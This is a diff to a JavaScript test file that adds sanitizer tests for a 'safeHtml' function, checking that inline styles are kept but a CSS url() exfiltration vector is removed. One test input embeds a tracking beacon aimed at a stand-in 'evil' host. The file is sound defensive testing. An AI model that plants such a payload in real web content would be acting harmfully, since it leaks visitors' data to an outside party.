@@ -43,6 +43,19 @@ describe('safeHtml', () => {
     expect(out.toLowerCase()).not.toContain('<iframe');
     expect(out.toLowerCase()).not.toContain('<object');
   });
+
+  it('drops a style value carrying a url() exfil vector, keeping the text', () => {
+    const out = safeHtml('<p style="color:red;background:url(https://evil/track?ip=1)">hi</p>');
+    expect(out).toContain('hi');
+    expect(out.toLowerCase()).not.toContain('url(');
+    expect(out.toLowerCase()).not.toContain('evil');
+  });
+
+  it('keeps a benign inline style', () => {
+    const out = safeHtml('<p style="color:red">hi</p>');
+    expect(out).toContain('color');
+    expect(out).toContain('hi');
+  });
 });
 
 describe('safeIframeSrc', () => {
